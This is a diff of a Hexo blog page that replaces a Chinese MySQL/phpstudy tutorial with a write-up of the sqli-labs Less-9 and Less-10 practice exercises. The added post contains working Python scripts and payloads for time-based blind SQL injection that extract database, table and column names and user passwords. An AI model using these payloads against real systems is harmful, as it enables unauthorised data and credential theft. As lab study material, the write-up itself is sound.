@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="利用phpstudy里的MySQL并通过命令行, Hexo">
+    <meta name="keywords" content="less9 and less 10, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>利用phpstudy里的MySQL并通过命令行 | Hexo</title>
+    <title>less9 and less 10 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">利用phpstudy里的MySQL并通过命令行</h1>
+                    <h1 class="description center-align post-title">less9 and less 10</h1>
                 </div>
             </div>
         </div>
@@ -444,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-11-06
+                    2021-11-28
                 </div>
                 
 
@@ -465,7 +465,42 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>打开phpstudy<br><img src="https://i.loli.net/2021/11/06/P2cLuyxH5dnY1ls.png" alt="1"><br>打开文件位置后将下列地址在环境变量中添加到系统变量Path中<br><img src="https://i.loli.net/2021/11/06/QFHrj19Dh4sxPBM.png" alt="2"><br>此时打开cmd检验依旧会拒绝访问<br><img src="https://i.loli.net/2021/11/06/TgVFG8tRfouJrUz.png" alt="3"><br>进入phpstudy中修改root密码<br><img src="https://i.loli.net/2021/11/06/8uEXtQLHPbzy79m.png" alt="4"><br>然后在cmd下输入 mysql -uroot -p，回车，提示输入密码，输入刚刚设置的密码，成功进入<br><img src="https://i.loli.net/2021/11/06/GyLYs1W7FNXlT5I.png" alt="5"><br>此时输入show databases就能显示mysql中的表<br><img src="https://i.loli.net/2021/11/06/VksnATLF9rClouZ.png" alt="6"><br>使用security的表，并展示表格<br><img src="https://i.loli.net/2021/11/06/TLrZ2FgG6VQk5oa.png" alt="7"><br>再次输入select * from users<br><img src="https://i.loli.net/2021/11/06/Km3x56TnfjSeJPE.png" alt="8"><br>Mysql简单用法：<br>查库：select schema_name from information_schema.schemata,查找所有的库<br><img src="https://i.loli.net/2021/11/06/vUpYBIsTuAF5lGX.png" alt="9"><br>查表:select table_name from information_schema.tables where table_schema=’security’<br><img src="https://i.loli.net/2021/11/06/veLp57ESxVbhkMz.png" alt="10"><br>查列：select column_name from information_schema.columns where table_name=’users’<br><img src="https://i.loli.net/2021/11/06/eXdzCniPZDK76Vk.png" alt="11"><br>查字段：select username,password from security.users<br><img src="https://i.loli.net/2021/11/06/BWIFV8bTyurRaJX.png" alt="12"></p>
+                <p>less9与less10相似，区别在于在使用延迟语句确认是否存在注入时，less9使用’时存在闭合，less10使用”时存在闭合。<br><img src="https://i.loli.net/2021/11/28/O6Gy3sjTAVtvl8B.png" alt="图片1.png"><br><img src="https://i.loli.net/2021/11/28/GUo4piLg73nW5PJ.png" alt="图片2.png"><br>知道存在注入后，由于此题在语法错误时仍然有you are in回显，<br>所以使用python进行时间盲注<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a target="_blank" rel="noopener" href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    name = ‘’<br>    for i in range(1, 9):<br>        for j in dic:<br>            payload = “ and if(substr(database(),%s,1)=’%s’,sleep(4),1)–+” %(i, j)<br>            url1 = url + payload<br>            print(url1)<br>            time1 = datetime.datetime.now()<br>            r = requests.get(url=url1)<br>            time2 = datetime.datetime.now()<br>            time3 = (time2 - time1).total_seconds()   //计算出在得出结果后经历的时间，大于4则if的条件为真则可以得到库名<br>            if time3 &gt;= 4:<br>                name += j<br>                print(name)<br>                break<br>    n = name<br>    print(‘数据库名字为:’ + n)<br>之后在运用for循环查出表名<br>    import requests<br>    import time<br>    import datetime<br>    url=”<a target="_blank" rel="noopener" href="http://www/Less-9/?id=1&#39;">http://www/Less-9/?id=1&#39;</a> “<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag1=””<br>    flag2=””<br>    flag3=””</p>
+<pre><code>flag4=&quot;&quot;
+for a in range(5):
+    for i in range(1, 9):
+        for j in dic:
+
+            payload = &quot; and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=&#39;%s&#39;),3,0)) --+&quot; % (
+            a, i, j)
+            url1 = url + payload
+            print(url1)
+            time1 = datetime.datetime.now()
+            r = requests.get(url=url1)
+            time2 = datetime.datetime.now()
+            time3 = (time2 - time1).total_seconds()
+            if time3&gt;=3:
+                if a==0:
+                    flag1+=j
+                    print(flag1)
+                elif a==1:
+                    flag2+=j
+                    print(flag2)
+                elif a==2:
+                    flag3+=j
+                    print(flag3)
+                elif a==3:
+                    flag4+=j
+                    print(flag4)
+                else:
+                    break
+
+print(&#39;数据库名字为:&#39; + flag1)
+print(&#39;数据库名字为:&#39; + flag2)
+print(&#39;数据库名字为:&#39; + flag3)
+print(&#39;数据库名字为:&#39; + flag4)
+</code></pre>
+<p>之后查列名及字段只需改变<br>     payload = “ and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>列名：<br>     payload = “ and sleep(if((substr((select column_name from information_schema.columns where table_name=’users’ limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>字段：<br>     payload = “ and sleep(if((substr((select password from security.users limit %s,1),%s,1)=’%s’),3,0)) –+” % (<br>                    a, i, j)<br>less10只需将1’改为1”即可</p>
 
                 
             </div>
@@ -492,7 +527,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/">http://example.com/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/</a>
+                    <a href="http://example.com/2021/11/28/less9%20less10/">http://example.com/2021/11/28/less9%20less10/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -697,9 +732,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/11/28/less9%20less10/">
                     <div class="card-image">
@@ -717,9 +753,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -728,6 +764,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -738,13 +775,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/31/%E4%B8%89%E5%AD%90%E6%A3%8B/">
+                <a href="/2021/11/06/%E5%88%A9%E7%94%A8phpstudy%E8%BF%9B%E8%A1%8Cmysql/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="C语言实现三子棋">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="利用phpstudy里的MySQL并通过命令行">
                         
-                        <span class="card-title">C语言实现三子棋</span>
+                        <span class="card-title">利用phpstudy里的MySQL并通过命令行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -755,7 +792,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-06
                             </span>
                         <span class="publish-author">
                             
